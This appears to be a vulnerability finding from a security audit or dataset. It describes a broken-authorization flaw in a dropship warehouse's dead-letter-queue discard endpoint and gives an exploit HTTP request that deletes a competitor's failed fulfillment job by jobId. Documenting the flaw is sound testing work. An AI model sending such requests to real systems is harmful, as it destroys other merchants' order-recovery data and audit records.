diagnosis: The dead-letter queue fulfillment purge endpoint discards and deletes failed order processing jobs based entirely on jobId in the request body, allowing rogue dropship merchants to delete competitor order fulfillment failures and destroy recovery audits.
exploit_request:
POST /api/dlq/fulfillment/discard HTTP/1.1
Host: warehouse.dropship.io:8010
Authorization: Bearer <store_vendor_jwt>
Content-Type: application/json

{"jobId": "dlq_order_competitor_881", "discardReason": "Marked invalid"}
